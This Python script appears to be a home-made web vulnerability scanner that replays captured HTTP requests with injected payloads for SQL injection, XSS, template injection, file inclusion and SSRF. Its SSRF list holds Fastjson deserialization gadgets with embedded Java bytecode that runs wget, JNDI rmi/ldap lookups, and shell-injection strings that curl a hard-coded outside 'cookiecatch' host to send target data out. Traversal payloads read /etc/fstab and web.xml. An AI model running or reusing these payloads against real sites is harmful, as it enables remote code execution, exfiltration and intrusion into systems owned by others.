#!/usr/bin/env python
# -*- coding: cp936 -*-
import urlparse,requests,re,os,base64
requests.packages.urllib3.disable_warnings()
import socket
socket.setdefaulttimeout(15)
from Loger import Loger
loger=Loger()
def dict2str(testdict):
    strline=""
    for key in testdict:
        strline+=key+"="+testdict[key]+"&"
    return strline[:-1]

def text_list(requestlist,scheme):
    requestdict={}
    if "GET " in requestlist[0]:
        requestdict['method']="GET"
        i=1
        dictheader = {}
        while i<len(requestlist)-1:
            headerzu=requestlist[i].split(':')
            headerkey=headerzu[0]
            if 'Content-Length' in headerkey or 'Accept-Encoding' in headerkey:
                i+=1
                continue
            headervalue=""
            j=1
            while j<len(headerzu):
                headervalue+=headerzu[j]+":"
                j+=1
            if headerkey.split() == '':
                i+=1
            dictheader[headerkey]=headervalue[:-1].strip()
            i+=1
        requestdict['headers']=dictheader
        testurl = scheme + "://" + requestdict['headers']['Host'].strip() + requestlist[0].replace('GET ', '').replace(' HTTP/1.1', '')
        if '?' not in testurl:
            return requestdict
        requesturl,requestparma=testurl.split("?")
        requestdict['url'] = requesturl
        requestdict['testurl'] = testurl
        parmazu=requestparma.split('&')
        pamadict={}
        for parma in parmazu:
            key,value=parma.split('=')
            pamadict[key]=value
        requestdict['query'] = pamadict
        return requestdict
    if "POST " in requestlist[0]:
        requestdict['method'] = "POST"
        dictheader={}
        i=1
        while i<len(requestlist)-2:
            headerzu = requestlist[i].split(':')
            headerkey = headerzu[0]
            if 'Content-Length' in headerkey or 'Accept-Encoding' in headerkey or headerkey.split()=="":
                i+=1
                continue
            headervalue = ""
            j = 1
            while j < len(headerzu):
                headervalue += headerzu[j]+":"
                j += 1
            dictheader[headerkey] = headervalue[:-1].strip()
            i += 1
        requestdict['headers'] = dictheader
        testurl = scheme + "://"+dictheader['Host'].strip()+requestlist[0].replace('POST ','').replace(' HTTP/1.1','')+"?"+requestlist[len(requestlist)-1]
        requestdict['url'] = scheme + "://" + requestdict['headers']['Host'].strip()+requestlist[0].replace('POST ','').replace(' HTTP/1.1','')
        requestdict['testurl']=testurl
        requestparma=requestlist[len(requestlist)-1]
        parmazu = requestparma.split('&')
        pamadict = {}
        for parma in parmazu:
            key, value = parma.split('=')
            pamadict[key] = value
        requestdict['query'] = pamadict
        return requestdict
    if "GET " not in requestlist[0] and "POST " not in requestlist[0]:
        return requestdict

def ReadFileToList(path):
    templist=[]
    filetxt=open(path,"r")
    for line in filetxt:
        templist.append(line.strip())
    filetxt.close()
    return templist

def requestGet():
    requestlist=[]
    requesttxtlist=os.listdir("request/")
    for r in requesttxtlist:
        request=ReadFileToList("request/"+r)
        requestlist.append(request)
    return requestlist


def send_request(dictrequest):
    #print dictrequest['url']
    #print dictrequest['query']
    dictstatus={}
    try:
        if dictrequest['method'] == "GET":
            testurl = dictrequest['url'] + '?' + dict2str(dictrequest['query'])
            try:
                r = requests.get(testurl, headers=dictrequest['headers'], verify=False, timeout=15)
                dictstatus['time'] = r.elapsed.total_seconds()
                dictstatus['content'] = r.text
                dictstatus['code'] = r.status_code
                dictstatus['headers'] = r.headers
                return dictstatus
            except Exception as ex:
                if 'timeout' in ex.message:
                    dictstatus['time'] = '15'
                    dictstatus['content'] = 'timeout'
                    dictstatus['code'] = '504'
                    dictstatus['headers'] = {}
                else:
                    dictstatus['time'] = '0'
                    dictstatus['content'] = ''
                    dictstatus['code'] = '500'
                    dictstatus['headers'] = {}
                return dictstatus
        if dictrequest['method'] == "POST":
            try:
                r = requests.post(dictrequest['url'], data=dictrequest['query'], headers=dictrequest['headers'],verify=False, timeout=15)
                dictstatus['time'] = r.elapsed.seconds
                dictstatus['content'] = r.text
                dictstatus['code'] = r.status_code
                dictstatus['headers'] = r.headers
                return dictstatus
            except Exception as ex:
                if 'timeout' in ex.message:
                    dictstatus['time'] = '15'
                    dictstatus['content'] = 'timeout'
                    dictstatus['code'] = '504'
                    dictstatus['headers'] = {}
                else:
                    dictstatus['time'] = '0'
                    dictstatus['content'] = ''
                    dictstatus['code'] = '500'
                    dictstatus['headers'] = {}
                return dictstatus
    except:
        return dictstatus




def sqltest(requestdict):
    rulelist=loger.ReadToList('sqlrule.txt')
    for key in requestdict['query']:
        temp=requestdict['query'][key]
        for rule in rulelist:
            if '^' in rule:
                requestdict['query'][key]=rule.replace('\n','')
            else:
                requestdict['query'][key] =requestdict['query'][key]+rule.replace('\n', '')
            request_status=send_request(requestdict)
            if request_status['time']>7:
                #print "��������ע�룺"+str(requestdict)+"���²��Ը�����"
                loger.LogWrite('testsql1.txt',requestdict['method']+" "+requestdict['url']+dict2str(requestdict['query']))
                request_status2 = send_request(requestdict)
                if request_status2['time']>7:
                    #print "����ע�룺"+str(requestdict)
                    loger.LogWrite('testsql2.txt',requestdict['method'] + " " + requestdict['url']+'?'+dict2str(requestdict['query']).replace('^',''))
            requestdict['query'][key] = temp

def ssrftest(requestdict):
    mubiao=base64.b64encode(requestdict['testurl'])
    rulelist=['eyJAdHlwZSI6ImNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwiLCJfYnl0ZWNvZGVzIjpbInl2NjZ2Z0FBQURFQU5Bb0FCd0FsQ2dBbUFDY0lBQ2dLQUNZQUtRY0FLZ29BQlFBbEJ3QXJBUUFHUEdsdWFYUStBUUFES0NsV0FRQUVRMjlrWlFFQUQweHBibVZPZFcxaVpYSlVZV0pzWlFFQUVreHZZMkZzVm1GeWFXRmliR1ZVWVdKc1pRRUFCSFJvYVhNQkFBMU1jR1Z5YzI5dUwxUmxjM1E3QVFBS1JYaGpaWEIwYVc5dWN3Y0FMQUVBQ1hSeVlXNXpabTl5YlFFQXBpaE1ZMjl0TDNOMWJpOXZjbWN2WVhCaFkyaGxMM2hoYkdGdUwybHVkR1Z5Ym1Gc0wzaHpiSFJqTDBSUFRUdE1ZMjl0TDNOMWJpOXZjbWN2WVhCaFkyaGxMM2h0YkM5cGJuUmxjbTVoYkM5a2RHMHZSRlJOUVhocGMwbDBaWEpoZEc5eU8weGpiMjB2YzNWdUwyOXlaeTloY0dGamFHVXZlRzFzTDJsdWRHVnlibUZzTDNObGNtbGhiR2w2WlhJdlUyVnlhV0ZzYVhwaGRHbHZia2hoYm1Sc1pYSTdLVllCQUFoa2IyTjFiV1Z1ZEFFQUxVeGpiMjB2YzNWdUwyOXlaeTloY0dGamFHVXZlR0ZzWVc0dmFXNTBaWEp1WVd3dmVITnNkR012UkU5Tk93RUFDR2wwWlhKaGRHOXlBUUExVEdOdmJTOXpkVzR2YjNKbkwyRndZV05vWlM5NGJXd3ZhVzUwWlhKdVlXd3ZaSFJ0TDBSVVRVRjRhWE5KZEdWeVlYUnZjanNCQUFkb1lXNWtiR1Z5QVFCQlRHTnZiUzl6ZFc0dmIzSm5MMkZ3WVdOb1pTOTRiV3d2YVc1MFpYSnVZV3d2YzJWeWFXRnNhWHBsY2k5VFpYSnBZV3hwZW1GMGFXOXVTR0Z1Wkd4bGNqc0JBSElvVEdOdmJTOXpkVzR2YjNKbkwyRndZV05vWlM5NFlXeGhiaTlwYm5SbGNtNWhiQzk0YzJ4MFl5OUVUMDA3VzB4amIyMHZjM1Z1TDI5eVp5OWhjR0ZqYUdVdmVHMXNMMmx1ZEdWeWJtRnNMM05sY21saGJHbDZaWEl2VTJWeWFXRnNhWHBoZEdsdmJraGhibVJzWlhJN0tWWUJBQWhvWVc1a2JHVnljd0VBUWx0TVkyOXRMM04xYmk5dmNtY3ZZWEJoWTJobEwzaHRiQzlwYm5SbGNtNWhiQzl6WlhKcFlXeHBlbVZ5TDFObGNtbGhiR2w2WVhScGIyNUlZVzVrYkdWeU93Y0FMUUVBQkcxaGFXNEJBQllvVzB4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsV0FRQUVZWEpuY3dFQUUxdE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQUYwQndBdUFRQUtVMjkxY21ObFJtbHNaUUVBQ1ZSbGMzUXVhbUYyWVF3QUNBQUpCd0F2REFBd0FERUJBQ2gzWjJWMElHaDBkSEE2THk4eE1qSXVNVEUwTGpFek5pNHhNRGd2Y0dod0wzTnpjbVl1Y0dod0RBQXlBRE1CQUF0d1pYSnpiMjR2VkdWemRBRUFRR052YlM5emRXNHZiM0puTDJGd1lXTm9aUzk0WVd4aGJpOXBiblJsY201aGJDOTRjMngwWXk5eWRXNTBhVzFsTDBGaWMzUnlZV04wVkhKaGJuTnNaWFFCQUJOcVlYWmhMMmx2TDBsUFJYaGpaWEIwYVc5dUFRQTVZMjl0TDNOMWJpOXZjbWN2WVhCaFkyaGxMM2hoYkdGdUwybHVkR1Z5Ym1Gc0wzaHpiSFJqTDFSeVlXNXpiR1YwUlhoalpYQjBhVzl1QVFBVGFtRjJZUzlzWVc1bkwwVjRZMlZ3ZEdsdmJnRUFFV3BoZG1FdmJHRnVaeTlTZFc1MGFXMWxBUUFLWjJWMFVuVnVkR2x0WlFFQUZTZ3BUR3BoZG1FdmJHRnVaeTlTZFc1MGFXMWxPd0VBQkdWNFpXTUJBQ2NvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhMMnhoYm1jdlVISnZZMlZ6Y3pzQUlRQUZBQWNBQUFBQUFBUUFBUUFJQUFrQUFnQUtBQUFBUUFBQ0FBRUFBQUFPS3JjQUFiZ0FBaElEdGdBRVY3RUFBQUFDQUFzQUFBQU9BQU1BQUFBUEFBUUFFQUFOQUJFQURBQUFBQXdBQVFBQUFBNEFEUUFPQUFBQUR3QUFBQVFBQVFBUUFBRUFFUUFTQUFFQUNnQUFBRWtBQUFBRUFBQUFBYkVBQUFBQ0FBc0FBQUFHQUFFQUFBQVZBQXdBQUFBcUFBUUFBQUFCQUEwQURnQUFBQUFBQVFBVEFCUUFBUUFBQUFFQUZRQVdBQUlBQUFBQkFCY0FHQUFEQUFFQUVRQVpBQUlBQ2dBQUFEOEFBQUFEQUFBQUFiRUFBQUFDQUFzQUFBQUdBQUVBQUFBYUFBd0FBQUFnQUFNQUFBQUJBQTBBRGdBQUFBQUFBUUFUQUJRQUFRQUFBQUVBR2dBYkFBSUFEd0FBQUFRQUFRQWNBQWtBSFFBZUFBSUFDZ0FBQUVFQUFnQUNBQUFBQ2JzQUJWbTNBQVpNc1FBQUFBSUFDd0FBQUFvQUFnQUFBQjBBQ0FBZUFBd0FBQUFXQUFJQUFBQUpBQjhBSUFBQUFBZ0FBUUFoQUE0QUFRQVBBQUFBQkFBQkFDSUFBUUFqQUFBQUFnQWsiXSwnX25hbWUnOidhLmInLCdfdGZhY3RvcnknOnsgfSwiX291dHB1dFByb3BlcnRpZXMiOnsgfSwiX25hbWUiOiJhIiwiX3ZlcnNpb24iOiIxLjAiLCJhbGxvd2VkUHJvdG9jb2xzIjoiYWxsIn0=','{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADEANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA1McGVyc29uL1Rlc3Q7AQAKRXhjZXB0aW9ucwcALAEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAuAQAKU291cmNlRmlsZQEACVRlc3QuamF2YQwACAAJBwAvDAAwADEBACh3Z2V0IGh0dHA6Ly8xMjIuMTE0LjEzNi4xMDgvcGhwL3NzcmYucGhwDAAyADMBAAtwZXJzb24vVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAAPAAQAEAANABEADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAEACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAVAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIAAAABABcAGAADAAEAEQAZAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAaAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGgAbAAIADwAAAAQAAQAcAAkAHQAeAAIACgAAAEEAAgACAAAACbsABVm3AAZMsQAAAAIACwAAAAoAAgAAAB0ACAAeAAwAAAAWAAIAAAAJAB8AIAAAAAgAAQAhAA4AAQAPAAAABAABACIAAQAjAAAAAgAk"],\'_name\':\'a.b\',\'_tfactory\':{ },"_outputProperties":{ },"_name":"a","_version":"1.0","allowedProtocols":"all"}','http://122.114.136.108/php/cookiecatch.php?str=wctest','QHR5cGUiOiJjb20uc3VuLnJvd3NldC5KZGJjUm93U2V0SW1wbCIsImRhdGFTb3VyY2VOYW1lIjoibGRhcDovLzEyMi4xMTQuMTM2LjEwODoxMTM4OS9vYmoiLCJhdXRvQ29tbWl0Ijp0cnVlfQ==','eyJAdHlwZSI6ImNvbS5zdW4ucm93c2V0LkpkYmNSb3dTZXRJbXBsIiwiZGF0YVNvdXJjZU5hbWUiOiJybWk6Ly8xMjIuMTE0LjEzNi4xMDg6MTEzODkvb2JqIiwiYXV0b0NvbW1pdCI6dHJ1ZX0=','{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://122.114.136.108:11389/obj","autoCommit":true}','{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://122.114.136.108:11389/obj","autoCommit":true}','http://122.114.136.108/php/cookiecatch.php?str='+requestdict['url'],'http://122.114.136.108/php/cookiecatch.php?str='+mubiao,'$(curl http://122.114.136.108/php/cookiecatch.php?str='+mubiao+')','|curl http://122.114.136.108/php/cookiecatch.php?str='+mubiao,'`curl curl http://122.114.136.108/php/ssrf.php`','`curl http://122.114.136.108/php/cookiecatch.php?str='+mubiao+'`']
    for key in requestdict['query']:
        temp=requestdict['query'][key]
        for rule in rulelist:
            requestdict['query'][key]=rule
            send_request(requestdict)
            requestdict['query'][key]=temp

def xsstest(requestdict):
    rulelist=['wctest','">wcshuangyinhao<',"'wcdanyinhao"]
    for key in requestdict['query']:
        temp=requestdict['query'][key]
        for rule in rulelist:
            requestdict['query'][key]=requestdict['query'][key]+rule
            request_status=send_request(requestdict)
            if rule in request_status['content'] and 'text/html' in request_status['headers']['Content-Type']:
                #print "��������xss��"+str(requestdict)
                loger.LogWrite('testxss.txt',requestdict['method']+" "+requestdict['url']+'?'+dict2str(requestdict['query']))
            requestdict['query'][key] = temp
    #tempurl=requestdict["url"]
    #for rule in rulelist:
        #requestdict["url"]=requestdict["url"]+rule
        #sendstatus=send_request(requestdict)
        #if rule in sendstatus["content"]:
            #loger.LogWrite('testxss.txt',requestdict['method'] + " " + requestdict['url'] + "?" + dict2str(requestdict['query']))
        #requestdict["url"]=tempurl

def modetest(requestdict):
    rulelist=["{1245+34211}","{1245+34212}","{{1245+34211}}","{{1245+34212}}"]
    for key in requestdict['query']:
        temp = requestdict['query'][key]
        for rule in rulelist:
            requestdict['query'][key]=rule
            request_status=send_request(requestdict)
            if '35456' in request_status['content'] and '35457' in request_status['content']:
                #print "��������ģ��ע�룺"+str(requestdict)
                loger.LogWrite('testmuban.txt',requestdict['method']+" "+requestdict['url']+dict2str(requestdict['query']))
            requestdict['query'][key] = temp
    tempurl=requestdict['url']
    for rule in rulelist:
        requestdict['url']=requestdict['url']+rule
        send_request(requestdict)
        requestdict['url']=tempurl

def includetest(requestdict):
    rulelist=["../../../../../../../../../etc/fstab","/etc/fstab","file:///etc/fstab","/WEB-INF/web.xml","../../../../../../WEB-INF/web.xml"]
    for key in requestdict['query']:
        temp = requestdict['query'][key]
        for rule in rulelist:
            requestdict['query'][key]=rule
            request_status=send_request(requestdict)
            if 'tmpfs' in request_status['content'] or 'filter-name' in request_status['content']:
                #print "�����ļ�������"+str(requestdict)
                loger.LogWrite('testmuban.txt',requestdict['method']+" "+requestdict['url']+dict2str(requestdict['query']))
            requestdict['query'][key] = temp

if __name__=="__main__":
    testlist=requestGet()
    havetestlist=[]
    for test in testlist:
        try:
            testdict = text_list(test, "https")
            #print testdict
            if testdict['method'] == 'GET' and '?' not in testdict['testurl']:
                continue
            requestdict = send_request(testdict)
            if requestdict['time'] > 10:
                #print "���󳬳�����������"
                continue
            else:
                if testdict['url'] not in havetestlist:
                    havetestlist.append(testdict['url'])
                    #xsstest(testdict)
                    ssrftest(testdict)
                    #includetest(testdict)
                    #modetest(testdict)
        except Exception as ex:
            print ex.message
            continue


